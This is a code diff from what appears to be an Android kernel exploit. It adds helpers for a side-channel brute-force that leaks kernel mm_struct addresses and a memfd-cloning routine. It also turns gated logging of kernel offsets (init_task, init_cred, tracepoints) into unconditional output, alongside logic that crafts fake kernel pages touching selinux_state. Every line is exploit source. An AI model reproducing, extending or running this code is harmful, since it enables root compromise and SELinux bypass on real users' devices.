@@ -69,6 +69,30 @@ int tcp_route_selected(void) {
   return active_offsets && active_offsets->compact_waiter;
 }
 
+void setup_kernelsnitch(void) {
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  ks = kernelsnitch_setup(
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
+}
+
+int kernelsnitch_collisions_ready(void) {
+  return kernelsnitch_found_collisions(ks);
+}
+
+void run_kernelsnitch_bruteforce(void) {
+  kernelsnitch_bruteforce(ks);
+}
+
+uintptr_t current_kernelsnitch_mm_struct(void) {
+  return ks->mm_struct;
+}
+
+uintptr_t cleanup_kernelsnitch(void) {
+  uintptr_t leaked = kernelsnitch_cleanup(ks);
+  ks = NULL;
+  return leaked;
+}
+
 void read_first_line(const char *path, char *buf, size_t len) {
   if (!len) {
     return;
@@ -135,13 +159,7 @@ void log_startup_context(void) {
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
-  {
-    const char *route = getenv("GHOSTLOCK_ROUTE");
-    pr_success("route=%s tcp=%d mcast=%d\n",
-               (route && *route) ? route : "(unset)",
-               tcp_route_selected(), mcast_route_selected());
-  }
-  gl_addr_log("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
+  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
@@ -158,11 +176,10 @@ void log_startup_context(void) {
    * /data/local/tmp/kallsyms_full.txt to see whether a device entry is right. */
   {
     const struct kernel_offsets *o = active_offsets;
-    (void)o; /* only read by the gated AUDIT lines below */
-    gl_addr_log("--- offsets audit pid=%d json_release=%s ---\n",
+    pr_success("--- offsets audit pid=%d json_release=%s ---\n",
                getpid(), o && o->uname_r[0] ? o->uname_r : "(none)");
 #define AUDIT(name, field, fallback)                                      \
-    gl_addr_log("AUDIT %-22s json=%016llx builtin=%016llx img_off=%016llx " \
+    pr_success("AUDIT %-22s json=%016llx builtin=%016llx img_off=%016llx " \
                "src=%s\n", name,                                          \
                (unsigned long long)(o ? o->field : 0),                    \
                (unsigned long long)(fallback),                            \
@@ -182,7 +199,7 @@ void log_startup_context(void) {
     AUDIT("tp_sys_exit_tp", off_tp_sys_exit_tp, 0);
     AUDIT("tp_sys_exit_funcs", off_tp_sys_exit_funcs, 0);
 #undef AUDIT
-    gl_addr_log("--- offsets audit end pid=%d ---\n", getpid());
+    pr_success("--- offsets audit end pid=%d ---\n", getpid());
   }
 }
 
@@ -217,7 +234,7 @@ uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
 uintptr_t g_init_cred_image;
 
 void init_p0_profile(void) {
-  gl_addr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
+  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
           (unsigned long long)p0_kernel_phys_load,
           (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
 }
@@ -330,6 +347,13 @@ void cleanup_page_prepare_state(void) {
   free_ctx_storage(&post_ctx);
   free(skb_buf);
   skb_buf = NULL;
+}
+
+int clone_memfd(void) {
+  pid_t child = clone_child();
+  int fd = open_memfd(child);
+  kill_child(child);
+  return fd;
 }
 
 void prepare_ctxs(void) {
@@ -706,7 +730,7 @@ uintptr_t prepare_good_kernel_page(void) {
        * selinux_state.initialized. an even byte there fails every SID lookup */
       if (pselect_custom_write == 1 && pselect_child_node &&
           ((fake_right >> 16) & 1) == 0) {
-        gl_addr_warn("page %016zx stores an even byte over "
+        pr_warning("page %016zx stores an even byte over "
                    "selinux_state.initialized; taking another\n", (size_t)base);
       } else {
         pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
